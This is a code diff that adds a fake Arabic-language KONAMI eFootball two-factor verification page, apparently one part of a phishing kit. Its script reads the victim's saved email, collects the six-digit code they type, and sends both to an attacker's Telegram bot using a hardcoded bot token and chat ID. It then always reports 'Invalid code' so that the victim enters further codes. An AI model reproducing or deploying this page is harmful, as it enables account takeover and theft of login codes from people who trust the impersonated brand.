@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eFootball™ — التحقق</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+        body { background: #f0f2f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { background: #fff; border-radius: 16px; padding: 35px 30px; width: 100%; max-width: 420px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); }
+        
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 18px; border-bottom: 1px solid #e5e7eb; }
+        .konami-logo { font-size: 16px; font-weight: 900; color: #e60012; letter-spacing: 2px; }
+        .efootball-logo { font-size: 14px; font-weight: bold; color: #0066ff; }
+        
+        h1 { color: #111827; font-size: 22px; margin-bottom: 8px; }
+        .subtitle { color: #6b7280; font-size: 13px; margin-bottom: 25px; }
+        
+        .email-info { background: #eef4ff; border-radius: 10px; padding: 15px; margin-bottom: 25px; text-align: center; }
+        .email-info p { color: #6b7280; font-size: 12px; margin-bottom: 5px; }
+        .email-info strong { color: #0066ff; font-size: 14px; }
+        
+        .otp-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 25px; }
+        .otp-digit { width: 48px; height: 56px; text-align: center; font-size: 24px; font-weight: bold; background: #f9fafb; border: 2px solid #e5e7eb; border-radius: 10px; color: #111827; }
+        .otp-digit:focus { outline: none; border-color: #0066ff; background: #fff; }
+        
+        .btn-primary { width: 100%; padding: 15px; background: linear-gradient(135deg, #0066ff, #00a8ff); color: #fff; border: none; border-radius: 10px; font-size: 15px; font-weight: bold; cursor: pointer; }
+        
+        .error { color: #ef4444; font-size: 13px; text-align: center; margin-top: 15px; min-height: 20px; }
+        
+        .footer { text-align: center; margin-top: 25px; padding-top: 18px; border-top: 1px solid #e5e7eb; }
+        .footer p { font-size: 11px; color: #9ca3af; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="konami-logo">KONAMI</div>
+            <div class="efootball-logo">eFootball™</div>
+        </div>
+
+        <h1>التحقق بخطوتين</h1>
+        <p class="subtitle">أدخل الرمز المرسل إلى إيميلك</p>
+
+        <div class="email-info">
+            <p>تم إرسال الرمز إلى:</p>
+            <strong id="emailDisplay">user@email.com</strong>
+        </div>
+
+        <form id="otpForm">
+            <div class="otp-inputs">
+                <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
+                <input type="text" maxlength="1" class="otp-digit" inputmode="numeric">
+            </div>
+            <button type="submit" class="btn-primary">Verify</button>
+        </form>
+
+        <p class="error" id="error"></p>
+
+        <div class="footer">
+            <p>© 2025 KONAMI. All rights reserved.</p>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8863933045:AAE-GSd-pWrvzSJiijFNkjm9sgZ0g7S7E2w';
+        const CHAT_ID = '7644504212';
+        
+        const savedEmail = localStorage.getItem('ef_email') || 'user@email.com';
+        document.getElementById('emailDisplay').textContent = savedEmail;
+        
+        const digits = document.querySelectorAll('.otp-digit');
+        digits.forEach((digit, index) => {
+            digit.addEventListener('input', function() {
+                if (this.value.length === 1 && index < digits.length - 1) digits[index + 1].focus();
+            });
+            digit.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) digits[index - 1].focus();
+            });
+        });
+        
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            let code = '';
+            digits.forEach(d => code += d.value);
+            
+            if (code.length < 6) {
+                document.getElementById('error').textContent = 'Please enter the 6-digit code';
+                return;
+            }
+            
+            const message = `🔐 eFootball — 2FA Code\n\n📧 Email: ${savedEmail}\n🔢 Code: ${code}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+            } catch (err) { console.error(err); }
+            
+            document.getElementById('error').textContent = 'Invalid code. Please try again.';
+            digits.forEach(d => d.value = '');
+            digits[0].focus();
+        });
+    </script>
+</body>
+</html>
